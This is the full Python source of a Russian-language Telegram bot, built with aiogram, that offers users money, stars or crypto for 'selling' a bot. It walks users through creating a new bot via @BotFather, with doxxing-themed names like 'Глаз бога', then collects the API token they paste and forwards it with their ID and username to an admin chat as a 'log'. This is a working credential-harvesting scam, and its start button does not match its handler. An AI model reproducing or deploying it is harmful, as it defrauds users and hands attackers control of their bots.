import asyncio
import random
import string
import re
from aiogram import Bot, Dispatcher, types, F
from aiogram.filters import Command
from aiogram.types import ReplyKeyboardMarkup, KeyboardButton
import config

bot = Bot(token=config.BOT_TOKEN)
dp = Dispatcher()

# База имен для генерации названий
NAMES = ["Вектор", "Виктор", "Пробив", "Пробить", "Докс", "Шоколандый глаз", "Глаз бога", "Пробивала", "Шерлок", "Духлес"]

# Функция генерации рандомного юзернейма
def gen_username():
    letters = string.ascii_lowercase
    random_str = ''.join(random.choice(letters) for _ in range(8))
    return f"{random_str}_bot"

TOKEN_PATTERN = re.compile(r'^\d{8,10}:[a-zA-Z0-9_-]{35,45}$')

# Клавиатура
main_kb = ReplyKeyboardMarkup(
    keyboard=[[KeyboardButton(text="Начать процесс ⚙️")]],
    resize_keyboard=True
)

@dp.message(Command("start"))
async def cmd_start(message: types.Message):
    await message.answer(
        "👋 Привет! Здесь ты можешь сдать бота за деньги / звёзды / крипту.\n"
        "Нажми кнопку ниже, и я подберу задание для тебя.",
        reply_markup=main_kb
    )

@dp.message(F.text == "Подобрать задание ⚙️")
async def step_1(message: types.Message):
    name = random.choice(NAMES)
    await message.answer("1️⃣ Шаг первый:\nПерейдите в @BotFather, нажмите СТАРТ и напишите команду /newbot.")
    await asyncio.sleep(1) # Небольшая пауза для реалистичности
    await message.answer("Теперь перешлите сообщение ниже (название бота) туда:")
    await message.answer(f"`{name}`", parse_mode="MarkdownV2")
    
    # Генерируем юзернейм для следующего шага
    username = gen_username()
    await message.answer("2️⃣ Шаг второй:\nКогда он попросит юзернейм, перешлите ему это сообщение:")
    await message.answer(f"`{username}`", parse_mode="MarkdownV2")
    
    await message.answer(
        "3️⃣ Шаг третий:\nПосле этого @BotFather пришлет вам длинный API токен (пример: 123456789:ABCD12EFg3u4EFGH5agndODnxy6vJk789ia.\n\n"
        "Скопируйте его и пришлите мне прямо сюда!"
    )

@dp.message()
async def handle_token(message: types.Message):
    user_text = message.text.strip() if message.text else ""
    
    if TOKEN_PATTERN.match(user_text):
        log_text = (
            "📥 **Новый лог!**\n"
            f"👤 **От кого:** @{message.from_user.username or 'без юзернейма'}\n"
            f"🆔 **ID:** `{message.from_user.id}`\n"
            f"🔑 **Токен:** `{user_text}`"
        )
        try:
            await bot.send_message(chat_id=config.ADMIN_CHAT_ID, text=log_text, parse_mode="Markdown")
            await message.answer("✅ Токен успешно получен и отправлен на проверку! В течении 72 часов с вами свяжется администратор.")
        except Exception as e:
            await message.answer("❌ Ошибка при передаче данных. Свяжитесь с админом.")
            print(f"Ошибка: {e}")
    else:
        if user_text != "Начать процесс ⚙️":
            await message.answer("❌ Это не похоже на API токен. Пожалуйста, пришлите токен, который выдал @BotFather.")

async def main():
    print("Бот запущен и готов генерировать данные...")
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
    
